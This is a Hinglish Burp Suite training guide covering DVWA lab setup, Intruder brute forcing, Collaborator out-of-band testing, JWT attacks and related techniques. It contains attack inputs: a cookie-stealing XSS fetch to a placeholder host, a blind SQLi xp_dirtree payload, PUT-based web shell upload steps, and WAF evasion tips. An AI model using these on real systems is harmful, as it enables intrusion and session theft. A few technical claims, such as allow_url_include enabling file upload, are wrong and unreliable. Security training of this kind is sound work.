# 🚀 Burp Suite Unfiltered: The Complete Pentester's Encyclopedia

*Bhai, ye woh master document hai. Isme tera foundation bhi hai aur woh advanced "secret weapons" bhi jo tujhe senior pro banayenge. Har concept ko padh, practice kar, aur real-world mein utaar.*

---

## **Module 1: Setting Up the Laboratory**

*Jab tak mahaul solid nahi hoga, practice bekaar hai. Pehle apna testing environment taiyar karo.*

### Topic 1.1: Local Lab Installation (XAMPP + DVWA)
- **XAMPP Install karo:** Windows par XAMPP download karo taaki local web server ban sake.
- **DVWA Download karo:** Damn Vulnerable Web Application (DVWA) download karo – ye intentionally vulnerable website hai practice ke liye.
- **Extract aur Move karo:**
    - `C:\xampp\htdocs` mein jaake saari default files delete karo.
    - DVWA folder extract karke yahan paste karo.
    - Folder ka naam `dvwa` rakh do (taaki URL short ho).
- **Database Configuration:**
    - `C:\xampp\htdocs\dvwa\config` mein `config.inc.php.dist` ko rename karo `config.inc.php`.
    - Notepad mein kholo aur password blank karo:
        `$_DVWA[ 'db_password' ] = '';`
        `$_DVWA[ 'db_user' ] = 'root';`
- **Start Services:** XAMPP Control Panel se Apache aur MySQL start karo.
- **Browser Setup:**
    - `localhost/dvwa/setup.php` par jao.
    - Neeche "Create Database" click karo.
    - Login page: `localhost/dvwa/login.php`
        **Default Credentials:** Username: `admin` | Password: `password`

### Topic 1.2: Enabling File Upload Vulnerability
- Agar Setup page par `allow_url_include -> Disabled` dikhe, toh file upload vuln disabled hai.
- **Enable Karne ka Tarika:**
    - XAMPP mein Apache ke Config par right-click → PHP (php.ini).
    - `allow_url_include = Off` ko `On` karo.
    - Save karo aur Apache restart karo.
- Refresh karne par `Enabled` ho jayega.

> **Pro-Tip:** Lab setup mein jo bhi error aaye, woh tumhari learning ka hissa hai. Google karo, fix karo, aage badho. Yehi real world hai.

---

## **Module 2: Burp Suite Basics & HTTP Fundamentals**

*Burp Suite ek tarah ka "Man-in-the-Middle" hai jo browser aur server ke beech mein baith ke sab dekh aur badal sakta hai. Pehle HTTP ko samjho, phir Burp ko.*

### Topic 2.1: Get Burp Suite Community
- Students ke liye Burp Suite Community edition best hai. Windows (64-bit) ke liye ise download karo.

### Topic 2.2: HTTP Methods – GET vs POST
| Method | Data Location | Use Case |
|--------|---------------|----------|
| **GET** | URL mein (parameters) | Data fetch karna, bookmarks, links |
| **POST** | Request Body mein | Data submit karna, forms, login |

### Topic 2.3: Understanding Request & Response
Jab tum Burp mein Intercept on karte ho, kuch aisa dikhta hai:
```
POST /dvwa/login.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0
...
username=admin&password=password&login=Login
```
- **Request Line:** `POST /dvwa/login.php HTTP/1.1`
- **Headers:** Host, User-Agent, etc.
- **Body:** `username=admin&password=password`

---

## **Module 3: Burp Suite – 1000 Feet Overview**

*Pehle poora battlefield dekh lo, phir weapon uthao. Burp ke tabs ka ek glance.*

### Topic 3.1: Core Tabs Explained
| Tab | Function |
|-----|----------|
| **Dashboard** | Automated activities ko control karo, Event Log aur Issue Activity yahan dikhti hai. |
| **Target** | Website ka structure (sitemap) dikhta hai, Spidering ke through. |
| **Proxy** | **Heart of Burp.** Traffic intercept, history, options. |
| **Intruder** | Brute force attacks, fuzzing. |
| **Repeater** | Manual request modification aur replay. |
| **Sequencer** | Tokens (Session IDs, Cookies) ki randomness check. |
| **Decoder** | Encode/decode data (Base64, URL, etc.). |
| **Comparer** | Do requests/responses ko compare karo. |
| **Logger** | Burp ke internal HTTP traffic ka log. |
| **Extender** | BApp Store se extensions load karo. |
| **User Options** | Global settings (font, theme, connections). |

> **Note:** Professional version mein extra features hain (Scan, Live Tasks), Community edition mein limited.

---

## **Module 4: Proxy Tab Deep Dive**

*Proxy woh darwaza hai jisse saara traffic guzarta hai. Iska sahi istemal seekho.*

### Topic 4.1: Proxy Sections
- **Intercept:** Requests ko rokna aur modify karna.
- **HTTP History:** Saari visited sites ka data.
- **WebSockets History:** WebSocket messages.
- **Options:** Listeners, Match/Replace, SSL pass through, etc.

### Topic 4.2: Firefox Setup for Burp
Firefox mein localhost traffic proxy nahi hota by default. Fix:
1. `about:config` mein jao.
2. Search `network.proxy.allow_hijacking_localhost`
3. Double-click karke **True** kar do.

### Topic 4.3: Match and Replace – On-the-fly Modification
Ye feature bahut powerful hai. Aap traffic ko real-time badal sakte ho.
- **Example:** User-Agent ko 'Mozilla' se 'Chrome' kar do.
- **Use Case:** WAF bypass, header injection.

### Topic 4.4: Advanced Proxy Settings
- **Intercept Rules:** Aap rules set kar sakte hain ki sirf GET ya POST methods hi intercept hon.
- **Response Modification:** Jaise input length limits ko remove karna.

> **Pro-Tip:** Match/Replace se tum har request mein apna custom header bhi daal sakte ho, jaise `X-Forwarded-For: 127.0.0.1` – IP spoofing ke liye.

---

## **Module 5: Burp Suite Professional – Scanning & Live Tasks**

*Ye features sirf Burp Suite Professional version mein available hote hain.*

### Topic 5.1: New Scan
Jab aap "New Scan" par click karte hain, toh aapko do options dikhte hain:
- **i) Crawl:** Ye Spidering jaisa hi hai. Burp website ke URL par jaakar saare links par click karta hai taaki naye URLs, content aur directories dhoond sake.
- **ii) Audit:** Iska matlab hai **Vulnerability Scanning**. Jo URLs Crawl se mile hain, unpar Burp specific vulnerabilities scan karta hai.
- **URL to Scan:** Yahan wo URL dena hota hai jise aap scan ya crawl karna chahte hain.

### Topic 5.2: Detailed Scope & Scan Configuration
- **i) Include URL Prefixes:** Wo specific directories jo aap scan karna chahte hain.
- **ii) Exclude URL Prefixes:** Wo directories jinhe aap scan nahi karna chahte (e.g., logout links ya sensitive admin panels).
- **Scan Configuration:** Aap library se configuration select kar sakte hain. Jaise "Audit checks - all except JavaScript analysis".
- **Crawling Settings:** Yahan se aap crawling limit, speed, time aur unique locations ki settings control kar sakte hain.

### Topic 5.3: Auditing, Login & Resource Pool
- **Auditing Settings:** Aap scan ki speed aur accuracy (Auditing speed & Audit Accuracy) control kar sakte hain.
- **Application Login:** Agar scan ke beech koi login page aata hai, toh aap Burp ko pehle se hi credentials (username/password) de sakte hain taaki wo login karke andar ke pages scan kar sake.
- **Resource Pool:** Ye system resources manage karne ke liye hai.
    - **Max Concurrent Requests:** Aap ek saath kitni parallel requests bhejna chahte hain.
    - **Delay between requests:** Do requests ke beech kitna gap hona chahiye (WAF se bachne ke liye useful hai).

### Topic 5.4: New Live Task
- Ye tasks background mein chalte rehte hain.
- **Tool Scope:** Aap select kar sakte hain ki kis tool ka traffic inspect karna hai (jaise sirf Proxy ka traffic).

### Topic 5.5: Target Tab - Site Maps
- **Target Tab:** Iska use target ko exactly check karne ke liye hota hai. Isme 3 main cheezein hain: **Site maps, Scope, aur Issue definition**.
- **Site Maps:** Left side mein saari crawled websites ki HTML, CSS, aur JS files dikhti hain.
- Aap request/response aur methods (GET/POST) ke saath status codes (e.g., 404) bhi dekh sakte hain.
- **Filter Option:** Aap sirf JS ya sirf HTML files dekhne ke liye filter laga sakte hain.

### Topic 5.6: Scope & Issue Definition
- **Target Tab (Right Click):** Request par right click karke use Repeater, Intruder ya Sequencer mein bhej sakte hain.
- **Scope:** Current kaam ke liye target define karna.
    - **Include in scope:** Jis URL par attack karna hai (e.g., `http://demo.testfire.net`).
    - **Exclude from scope:** Jis directory ya URL ko scan se bahar rakhna hai.
- **Issue Definition:** Isme saari vulnerabilities ki detail mein explanation hoti hai.

### Topic 5.7: Content Discovery (Burp Pro)
- Ye feature hidden files aur folders dhoondne ke liye trial scan karta hai.
- **Difference:**
    - **Crawling/Spidering:** Sirf wahi links follow karta hai jo page par pehle se maujood hain.
    - **Content Discovery:** Potential files aur folders ki list use karke "hidden" content dhoondta hai.

---

## **Module 6: Intruder – The Brute-Force Engine**

*Intruder woh machine gun hai jo payloads ki barish kar deta hai. Lekin sahi settings ke saath.*

### Topic 6.1: Intruder Tabs
1. **Target:** Host aur port set karo (443 for HTTPS, 80 for HTTP).
2. **Positions:** Kaunse parameters test karne hain.
3. **Payloads:** Wordlist, encoding, processing.
4. **Resource Pool:** Speed control.
5. **Options:** Grep Match, error handling, etc.

### Topic 6.2: Positions Tab – Marking Parameters
- By default, Burp saare parameters select kar leta hai. Lekin humein sirf username aur password chahiye.
- **Manual Marking:** Select karo aur `Add §` button se mark karo.
- **Auto:** Reset karne ke liye.
> **Note:** Agar tumne galti se kuch galat select kar diya hai, toh **Auto** par click karo, wo reset kar dega.

### Topic 6.3: Attack Types Comparison
| Attack Type | Payload Lists | Logic | Best Use Case |
|-------------|---------------|-------|---------------|
| **Sniper** | 1 list | Ek time par ek position replace karta hai. | Single parameter testing (e.g., password only). |
| **Battering Ram** | 1 list | Ek hi payload sab positions mein ek saath. | Same value multiple parameters (e.g., username=admin, password=admin). |
| **Pitchfork** | Multiple lists (parallel) | Har list se ek-ek item uthata hai parallelly. | Username + Password pairs (matching sets). |
| **Cluster Bomb** | Multiple lists (all combinations) | Har list ka har item doosre list ke har item ke saath. | Full brute-force, permutations. |

> **Note:** Sniper ke liye formula: `(No. of positions) x (Payload list size)`. Cluster Bomb ke liye: `(size list1) x (size list2) x ...`.

### Topic 6.4: Payloads Tab – Where the Magic Happens
- **Payload Set:** 1 or 2 or anything.
- **Payload Type:** **Brute forces**, **Date**, **Number**, etc.
- **Payload Option [Simple list]:**
    - Suppose tumhare paas `password.txt` file hai brute forcing ke liye.
    - **Load** par click karke file select karo.
    - Ya phir **Add** par click karke manually password list mein daalo.
- **Payload Processing:**
    - Isse tum payload ko server par bhejne se pehle **encode** (jaise **base64**) kar sakte ho.
    - **Match/Replace** aur **Add Prefix** jaise options bhi hain.
    - **Add Prefix:** Agar tumhein har password/username ke aage kuch lagana hai (e.g., `Dadmin`, `Dsatyam`), toh `D` ko prefix bana sakte ho.
- **Payload Encoding:** URL encoding ke through payload bhejne ke liye use hota hai.

### Topic 6.5: Resource Pool – Speed Control
Agar target weak server hai, toh delay daalna zaroori hai, warna server crash ho sakta hai.
- **i) Max Concurrent Request:** Ek saath kitni requests jayengi.
- **ii) Delay between requests:** Do requests ke beech ka gap.
> **Note:** Tumhein apna **custom resource pool** select karna padega, warna ye **Default** wala hi lega.

### Topic 6.6: Options Tab
1. **Error Handling:** Agar attack mein error aaye toh kya karna hai.
2. **Attack Result:**
    - a) Store requests
    - b) Store responses
    - c) Use **Denial of Service (DoS)** mode (Sirf brute force karega without waiting for response).
3. **Grep Match:**
    - Ye bahut kaam ka feature hai.
    - Example: Tumne "welcome" word diya.
    - Ab **Bruteforcing** ke waqt agar kisi request ya response mein "welcome" word milega, toh ye ek naye section mein "welcome" show karega.
    - Iske aur bhi options tum **Bug Bounty** ke waqt seekhoge.

### Topic 6.7: Starting Attack & Analyzing Results
- **Start Attack** click karte hi brute-force shuru.
- Har request par click karo to see Request & Response.
- **Status Code:** Isse pata chalta hai ki username/password sahi hai ya nahi (e.g., 200 OK vs 401 Unauthorized).
- **Length:** Correct credentials ka response length aksar galat credentials se alag hota hai (e.g., 4608 vs 4565).

> **Pro-Tip:** Agar same length hai, toh grep match ka use karo. Agar sab failed dikhe, toh check karo ki payloads sahi format mein bheje ja rahe hain ya nahi.

---

## **Module 7: Repeater – The Manual Hacker's Best Friend**

*Repeater woh tool hai jisse tum request ko baar-baar modify kar ke response dekh sakte ho. Jaise scientist experiment karta hai.*

### Topic 7.1: Sending Requests to Repeater
- Intercept karo request → Right click → **Send to Repeater**.
- Repeater tab mein open hoti hai.

### Topic 7.2: Features
- **Request Modify karo:** Parameters, headers, body badlo.
- **Send:** New response aata hai.
- **Render:** Response ko browser-like dekho.
- **Multiple Tabs:** Har request ka alag tab, rename bhi kar sakte ho (double-click).
- **Undo/Redo:** Send button ke bagal mein arrows se history navigation.
- **Change Request Method:** Right-click par method change (GET↔POST).
- **Paste URL as Request:** URL copy karo, Repeater mein right-click → `Paste URL as Request`. Seedha request ban jayegi.

> **Note:** Repeater mein tum purani requests par bhi wapas ja sakte ho, jo debugging mein kaam aata hai.

---

## **Module 8: Utility Tabs – Sequencer, Decoder, Comparer, Logger**

*Ye chhote tools hain jo bade kaam karte hain.*

### Topic 8.1: Sequencer – Token Randomness Tester
*Cookies, Session IDs, CSRF tokens – agar ye guess ho jayein, toh poora account hijack. Sequencer check karta hai ki ye kitne random hain.*

**When to Use Sequencer?**
- Jab login ke baad server ek unique token deta hai.
- Agar token weak randomness ho, toh hum next token predict kar sakte hain.

**Steps to Use Sequencer:**
1. Request intercept karo jisme token generate ho raha ho.
2. Right click → **Send to Sequencer**.
3. **Token Location within Response:** Choose karo – form field ya custom location.
4. **Start Live Capture:** Burp 100s of requests bhejega, tokens collect karega.
5. **Analyze Now:** Tokens ki randomness ka report dekho.

> **Note:** Jab bhi hum login karte hain, humein ek **Invitation Card** milta hai jise **Session ID** kehte hain. Har request ke liye **Session ID** alag hoti hai. Agar tum kisi ka **Session ID** guess kar lo, toh tum uske account mein "Marriage" (Login) mein enter kar sakte ho.
> **Note:** 200 ya 300 tokens capture hone ke baad process ko stop kar dein. Tokens ko copy karke kahin save kar lein aur check karein ki wo similar hain ya completely random.

**Lab - DVWA Weak Session ID Vulnerability:**
1. **DVWA** mein **Weak Session ID** vulnerability par jayein.
2. Pehle **DVWA Security** ko **Medium** par set karein.
3. **Intercept the Request:** Request ko intercept karein aur "Generate" par click karein. Har baar ek nayi request generate hogi jisme ek naya **Session ID** hoga.
4. Aapko **Cookie** response mein dikhegi, request mein nahi. `i.e -> Set-Cookie: dvwaSession = 16273421`
5. DVWA se request select karke use **Sequencer** mein bhejein (Right click -> Send to Sequencer).
6. **Token Location within Response** mein aap dekhenge ki wo cookie automatically detect ho gayi hai. `i.e -> dvwaSession = 162789321 is added`
7. Ab **Start Live Capture** par click karein.

### Topic 8.2: Decoder
- Encode/decode data – Base64, Hash, URL, HTML, Hex, etc.
- Ye tab **URL Encoding** aur **Brute-forcing passwords** ke waqt bahut kaam aata hai.

### Topic 8.3: Comparer
- Do alag-alag requests ya responses ko compare karne ke liye (Word level ya Byte level par).
- Aap multiple requests ya responses ko compare karne ke liye bhej sakte hain.
- End mein aap kisi ek specific field ko dusre se compare karke difference dekh sakte hain.
> **Tip:** Niche ek checkbox hota hai `[Sync Views]`. Agar aap ise tick karenge, toh dono windows ek saath move hongi, jisse comparison easy ho jata hai.

### Topic 8.4: Logger
- Burp Suite jo bhi HTTP traffic generate karta hai, uski poori list yahan hoti hai.
- Iske through aap packets ko intercept karte waqt bahut saare filters laga sakte hain.
    - Discard items without response.
    - Capture only **HTML**, **CSS**, etc.
    - Capture based on **Status Code**.

---

## **Module 9: Extender, User, & Project Options**

### Topic 9.1: Extender Tab
- Is tab ka use extensions install karne ke liye hota hai. Aap **BApp Store** se naye extensions download kar sakte hain jo manual testing ko fast banate hain.

### Topic 9.2: User and Project Options
Ye Burp ki global settings hoti hain. Isme ek **User Option Tab** hota hai jisme ye char main categories hain:
1. **Connection**
2. **TLS**
3. **Display**
4. **Misc**

### Topic 9.3: Connections Settings
- **i) Platform Authentication:** Kabhi-kabhi kuch pages ko access karne ke liye login credentials chahiye hote hain. Yahan aap **Host**, **Username**, aur **Password** add kar sakte hain. Jab bhi aap wo page access karenge, aap automatically log in ho jayenge.
- **ii) Upstream Proxy Servers:** Agar aap nahi chahte ki aapka attack direct target par jaye, toh aap traffic ko redirect kar sakte hain.
    - Traffic pehle **1st Proxy Server** (Middle server) par jayega, aur fir destination server tak pahuchega.
    - **Example setup:** Click on **Add** -> Destination Host: `*` | Proxy Host: `localhost` | Proxy Port: `8081`
    - Ek aur Burp Suite open karein, Proxy options mein jayein aur Proxy Listener add karein `127.0.0.1:8081` par.
    - Ab traffic pehle 1st Burp mein aayega, fir forward karne par 2nd Burp mein, aur fir server par jayega.
- **iii) SOCKS Proxy:** Ye proxy aapko **Anonymous** rehne mein help karti hai. Kabhi-kabhi servers Intruder se aane wale data ko block kar dete hain, tab **SOCKS Proxy** ka use karke data bheja ja sakta hai.

### Topic 9.4: Display Settings
- **i) User Interface:** Isse aap Burp ka **Font Size** aur **Theme** (Light/Dark) control kar sakte hain.
- **ii) HTTP Message Display:** Iske through aap request aur response ke andar dikhne wale **HTTP message font size** ko control kar sakte hain.

### Topic 9.5: Misc (Miscellaneous) Settings
- **i) Automatic Project Backups:** Project ko automatically save karne ke liye.
- **ii) Temporary Files Location:** Temp folders mein data save karne ke liye.
- **iii) Proxy Interception:** Ye set karne ke liye ki **Proxy Listening** by default 'On' rahegi ya 'Off'.

---

## **Module 10: HTTP Method Exploitation & File Upload**

### Topic 10.1: Risky HTTP Methods
Hum aksar sirf do methods jaante hain: **GET** aur **POST**. Lekin aur bhi bahut hain jo potentially risky hote hain agar server par enabled hon:
| Common Methods | Advanced Methods |
| --- | --- |
| GET | PUT |
| POST | DELETE |
|  | TRACE |
|  | OPTIONS |
|  | HEAD |
|  | ...and more |

- **PUT:** Iske through aap server par file upload kar sakte hain.
- **DELETE:** Isse aap server se files delete kar sakte hain.
- **OPTIONS:** Ye batata hai ki server par kaun-kaun se methods enabled hain.

> **Note:** Agar server par **PUT method** enabled hai, toh aap malicious file upload karke pura server hack kar sakte hain.
> **Problem condition:** Folder ki permission **777** honi chahiye (Anyone can write).
> **Attack Scenario:** Writable permission + PUT method = Malicious file upload possible.

### Topic 10.2: HTTP Method Exploitation (Practical Steps)
**Attack Workflow:**
1. Pehle koi bhi request **Intercept** karein.
2. Request par right-click karke use **Repeater** mein bhejein taaki hum use modify kar sakein.
3. Request mein `GET` method ko change karke `OPTIONS` karein ye dekhne ke liye ki server kya allow kar raha hai.

| Request | Response |
| --- | --- |
| `OPTIONS / HTTP/1.1` | `HTTP/1.1 200 OK` |
|  | `Allow: DELETE, PROPFIND, PUT, MOVE, COPY, UNLOCK... etc.` |

Agar response mein `PUT` dikh raha hai, iska matlab method enabled hai.

**Exploitation Step:**
Ab method ko `PUT` mein change karein aur file create karein.
- Request: `PUT /test/shell.php HTTP/1.1`
- Response: `HTTP/1.1 201 Created` ya `204 No Content`

**Key Execution Steps & Logic**
- **File Naming:** Yahan hamari file ka naam `shell.php` hai aur iske andar ka content hum decide karenge.
- **Message Body:** Request ke message body mein jo text ya data hum bhejenge, wahi `shell.php` ke andar store hoga.
- **Payload Injection:** Message body mein simple text ki jagah hume **php reverse connection payload** dena hota hai. Isse hum directly server ka control haasil kar sakte hain.
- **Execution Flow:** Jab aap browser ke through `shell.php` ko browse karoge, toh aapko ya toh uska content dikhega ya reverse connection trigger hoga. Aisa isliye hota hai kyunki browse karne par file server-side par **execute** ho jati hai.

> **Note:** **C99shells** payloads ki ek aisi list hoti hai jo aapko server ka **graphical access** (GUI) provide kar sakti hai, jisse server management aur aasan ho jata hai.

### Topic 10.3: File Upload & Max Length Limit Bypass
Servers kabhi-kabhi sirf `Content-Type` check karte hain, content nahi.
- `e.g. ->` Agar page sirf `.txt` file mang raha hai aur aapne image upload ki, toh server use reject kar dega.
- **Bypass:** Ek real image upload karein aur request intercept karke `Content-Type` ko `image/jpeg` ya `image/png` mein change karein.

---

## **Module 11: Burp Collaborator – Blind Vulnerabilities ka Spy**

*Jab server direct response nahi deta, tab Collaborator external server ban ke interactions capture karta hai – DNS, HTTP, SMTP.*

### Topic 11.1: Core Concept – OAST
**Out-of-band Application Security Testing (OAST):** Tum Collaborator domain ko payload mein daalte ho. Agar server us domain ko hit karta hai (DNS lookup, HTTP request), to Collaborator ko pata chal jata hai – vulnerability confirmed.

### Topic 11.2: Collaborator Client Setup
- Burp mein **Burp Collaborator client** tab hota hai.
- **Generate Collaborator Payload:** "Copy to clipboard" se ek unique domain milta hai (e.g., `xyz123.burpcollaborator.net`).
- **Poll Now:** Check karo ki server ne koi request bheji ya nahi.

### Topic 11.3: Blind Vulnerability Testing Scenarios
**A. Blind SSRF**
```
POST / HTTP/1.1
Host: target.com
Referer: http://your-collaborator-domain.burpcollaborator.net
```
- **Pro-Tip:** Har jagah Collaborator domain daalo - Referer, X-Forwarded-For, User-Agent, XML external entities mein. Server ne request ki? SSRF confirmed.

**B. Blind SQLi via DNS**
```sql
' OR 1=1; exec master..xp_dirtree '\\your-collaborator-domain\share' --
```
- SQL server DNS lookup karega, Collaborator hit hoga.

**C. Blind RCE Testing**
```bash
nslookup your-collaborator-domain
ping -c 4 your-collaborator-domain
curl http://your-collaborator-domain
```

**D. Out-of-band XSS**
```html
<script>fetch('http://your-collaborator-domain?cookie='+document.cookie)</script>
```

### Topic 11.4: Collaborator Interactions Analysis
- **DNS Interactions:** Kya server ne domain resolve karne ki koshish ki?
- **HTTP Interactions:** Kya server ne koi request bheji? Headers, IP, timestamp sab capture hota hai.
- **SMTP Interactions:** Email-based vulnerabilities ke liye.
- **TLS Interactions:** Encrypted traffic analysis.

### Topic 11.5: Custom Collaborator Server (Self-Hosted)
Production engagements mein public Collaborator avoid karo (data leak ho sakta hai). Apna private server banao.
- Burp Suite Pro users apna private Collaborator server host kar sakte hain.
- Apna domain register karo, DNS records configure karo.

> **Pro-Tip:** "Bhai, Blind vulnerabilities dhundhni hain toh Collaborator tera best friend hai. Payload mein apna Collaborator domain daal aur chup chaap coffee pee. Server ne teri domain ko hit kiya? Vulnerable! Bas DNS interactions dekhna, HTTP nahi aaya toh bhi kaam chal jayega."

---

## **Module 12: Macros & Session Handling Rules**

*Modern apps mein CSRF tokens aur session timeout automation ke bina test karna mushkil hai. Macros se ye problems solve hoti hain.*

### Topic 12.1: Macros Fundamentals
- **Macro Kya Hai?:** Pre-recorded sequence of requests jo automatically execute hoti hai.
- **Use Case:** CSRF token refresh, session maintenance, login before attack.

### Topic 12.2: Macro Creation Steps
1. **Project Options > Sessions > Macros > Add.**
2. Proxy history se woh requests select karo jo token fetch karti hain (e.g., GET request jo naya CSRF token return kare).
3. **Configure:** Burp automatically parameters identify karega. Aap batao ki response se token kaise extract karna hai.

**Example – CSRF Token Extraction:**
Response mein: `<input name="csrf" value="abc123">`
Macro setting: `Extract using regex name="csrf" value="([^"]*)"`

### Topic 12.3: Custom Parameter Handling in Macros
- **Derive from First Request:** Pehli request se value lo.
- **Derive from Last Request:** Akhri request se value lo.
- **Use Custom Location:** Regex ya XPath se specific value extract karo.

### Topic 12.4: Session Handling Rules
1. **Project Options > Sessions > Session Handling Rules > Add.**
2. **Rule Actions > Run a Macro:** Macro ko rule ke saath link karo.
3. **Scope Configuration:** Kis URL/tool ke liye ye rule apply hoga (e.g., only Intruder, only specific scope).

### Topic 12.5: Advanced Session Configurations
**A. Check Session is Valid**
- Pehle check karo ki current session valid hai ya nahi (e.g., koi request bhejo, agar 302 redirect aa raha login page, toh session expired).
- Agar expired hai, tabhi macro chalao.

**B. Handle CSRF Tokens Automatically**
- Macro token fetch karega.
- **Update Request With:** Extracted token ko main request mein inject karo (usually a parameter).

**C. Login Sequence Automation**
- **Macro:** Login request (username/password) + cookie capture.
- **Rule:** Har naye scope ke liye login macro chalao.

### Topic 12.6: Cookie Jar Configuration
- **Use Cookies from Cookie Jar:** Burp automatically cookies store karta hai.
- Scope-specific cookie jars bana sakte ho.

> **Pro-Tip:** "CSRF token har request mein change hota hai aur tu manually copy-paste kar raha hai? Macros bana le. Ek baar configure kar, phir Intruder apne aap har request se pehle token fetch karega. Banking apps test kar raha hai toh ye survival guide hai."

---

## **Module 13: Advanced BApp Extensions – Deep Dive**

*Burp ki basic functionality kaafi hai, lekin extensions se ye Iron Man ban jata hai. BApp Store se ye must-have extensions install karo.*

### Topic 13.1: AuthAnalyzer / AuthMatrix – IDOR Automation
**Installation:** BApp Store > Search > Install

**AuthAnalyzer Workflow:**
1. **Record Base Request:** Admin user ki request capture karo.
2. **Add Test Users:** Low-privilege user, anonymous user, different roles.
3. **Configure Parameters:** Session tokens, cookies, headers automatically replace honge.
4. **Run Analysis:** Ek saath 100+ users ke saath request replay.
5. **Compare Responses:** Status code, length, content analysis – jo admin jaisa response de, woh IDOR hai.

**AuthMatrix Features:**
- **Role Matrix:** Admin, Manager, User, Guest - sabke saath test.
- **Unauthenticated Checks:** Bina login ke kya access ho raha hai.
- **Forced Browsing Detection:** Hidden endpoints par role-based access.

> **Pro-Tip:** "Manual IDOR testing? 100 users hain toh saal lag jayenge. AuthAnalyzer laga, ek baar config kar aur soja. Jo response admin jaisa dikhega, wahi IDOR hai. Pro tip: 401 vs 200 ka difference dekh, 200 aaya toh bug confirmed."

### Topic 13.2: Turbo Intruder – Race Conditions & High-Speed Attacks
**Installation:** BApp Store > Turbo Intruder

**Python-Based Architecture:**
```python
def queueRequests(target, weapons):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=100,
                           pipeline=False)
    for i in range(1000):
        engine.queue(target.req, i)
```

**Race Condition Testing:**
1. **Scenario:** Ek coupon code ko multiple times apply karna.
2. **Turbo Intruder Setup:** 50 concurrent requests ek saath bhejo.
3. **Analyze:** Agar ek se zyada baar apply ho gaya, race condition.

**Use Cases:**
- **Gift Card Redeem:** Ek card multiple baar redeem.
- **Inventory Bypass:** Limited stock mein ek saath multiple orders.
- **Rate Limit Bypass:** WAF ko overwhelm karo.

**Configuration Options:**
- **Concurrent Connections:** 1 se 100+.
- **Requests per Connection:** Keep-alive connections.
- **Pipelining:** HTTP pipelining enable/disable.
- **Failed Request Handling:** Retry policies.

> **Pro-Tip:** "Normal Intruder 1 sec mein 10 requests bhejta hai, Turbo Intruder 1000. Race condition dhundhni hai? Coupon code ek hi baar apply hona chahiye, lekin 50 requests ek saath bhej. Agar 2 baar apply ho gaya, toh race condition mil gayi. Payment logic test karne ka ye sabse tez tarika hai."

### Topic 13.3: Param Miner – Hidden Parameter Discovery
**Installation:** BApp Store > Param Miner

**Core Functionality:**
- **Passive Scan:** Background mein chalta hai, hidden parameters detect karta hai.
- **Active Scan:** Custom wordlist se parameters brute-force karta hai.

**Detection Capabilities:**
- **Cache Poisoning Parameters:** `?cb=123` jaise cache busters.
- **Hidden GET/POST Parameters:** Jo UI mein nahi dikhte.
- **Server Headers:** `X-Forwarded-For`, `X-Original-URL` etc.
- **Framework Specific:** `_method` (HTTP method override), `debug` parameters.

**Parameter Brute-Forcing:**
1. Request select karo > Right Click > Extensions > Param Miner > Guess GET/POST parameters.
2. Wordlist se thousands parameters try honge.
3. Jo naye parameters response change karein, woh vulnerable ho sakte hain.

**Use Cases:**
- **Hidden Admin Functions:** `?admin=true`, `?debug=1`.
- **SQL Injection Points:** Hidden parameters jo server process karta hai.
- **Cache Poisoning:** Unique parameters cache behavior change kar sakte hain.

> **Pro-Tip:** "UI mein 3 parameters dikhte hain, backend mein 10 process hote hain. Param Miner un hidden 7 ko dhoond ke laata hai. Jaise `?test=1` daala aur response mein 'Test Mode Enabled' aaya, iska matlab developer debug mode bhool gaya. CVE yahin se shuru hoti hai."

### Topic 13.4: JWT Editor – JSON Web Token Testing
**Installation:** BApp Store > JWT Editor

**Key Features:**
- **View/Edit JWTs:** Tokens ko decode karo, claims modify karo.
- **Signing Keys Management:** New keys generate karo, existing import karo.
- **Attack Automation:** Built-in attacks with one click.

**Attack Types:**
**A. Algorithm Confusion**
- `alg: HS256` ko `alg: none` mein change karo.
- Server accept karta hai? Authentication bypass.

**B. Key Confusion (RS256 -> HS256)**
- Public key se sign karo as HS256.
- Server public key verify karega? RCE possible.

**C. Brute-Force Weak Secrets**
- Weak signing key? JWT Editor brute-force karega.

**D. Kid (Key ID) Injection**
- `kid` parameter mein path traversal: `../../../../dev/null`
- SQL injection in `kid`: `' UNION SELECT ...`

**Workflow:**
1. Request capture karo with JWT.
2. Send to JWT Editor.
3. Modify claims (e.g., `"admin": true`).
4. Re-sign with appropriate key.
5. Send modified request.

> **Pro-Tip:** "JWT mila? Pehle `alg: none` try kar. Agar server ne maan liya, poora authentication bypass. Phir `kid` parameter dekh, path traversal try kar. Weak signing key hai? Brute-force kar. Modern APIs ki chabi JWT editor ke paas hai."

### Topic 13.5: Other Essential Extensions
| Extension | Purpose | Pro-Tip |
|-----------|---------|---------|
| **Active Scan++** | Additional scan checks | Burp's default scan se zyada vulnerabilities detect karta hai |
| **Backslash Powered Scanner** | Advanced injection points | Encoding bypass ke liye |
| **CSP Auditor** | Content Security Policy analysis | CSP bypass techniques |
| **Freddy** | Deserialization testing | Java/Node/PHP deserialization |
| **GAP** | Wayback machine integration | Archived URLs se endpoints dhoondho |
| **HTTP Request Smuggler** | Request smuggling | Modern HTTP/2 attacks |
| **JS Miner** | JavaScript analysis | Hidden endpoints in JS files |
| **403 Bypasser** | Access control bypass | 403 forbidden ko 200 mein convert |

---

## **Module 14: API & Modern Web Testing**

*Aaj ki apps APIs par chalti hain – REST, GraphQL, WebSockets. Burp ko inke hisaab se taiyar karo.*

### Topic 14.1: JWT (JSON Web Tokens) Deep Dive
**JWT Structure:**
`header.payload.signature` – teeno parts Base64 encoded.

**Critical Vulnerabilities:**
- **None Algorithm Attack:** Header mein `alg` ko `none` karo, signature hata do. Server accept karta hai?
- **Algorithm Confusion (CVE-2016-10555):** RS256 (asymmetric) public key available hai. HS256 (symmetric) mein same public key use karo. Server verify kar lega?
- **Key Injection (CVE-2018-0114):** `jku` (JWK Set URL) header mein apna server URL daalo. Server aapki public key use karega.
- **Weak HMAC Key:** Weak secret (e.g., "secret") ko brute-force karo (`hashcat -m 16500`).
- **Kid Parameter Injection:** Path Traversal, SQL Injection.

> **Pro-Tip:** JWT mila toh pehle step: Base64 decode karo. Header mein `alg: none` try kar. Kaam kiya? Critical bug. Phir `kid` parameter dekh, path traversal try kar.

### Topic 14.2: GraphQL Testing
**GraphQL Basics:**
- Single endpoint (usually `/graphql`).
- POST requests with JSON body.
- Introspection se poora schema pata chal sakta hai.

**Reconnaissance:**
```graphql
query { __schema { types { name fields { name type { name kind } } } } }
```
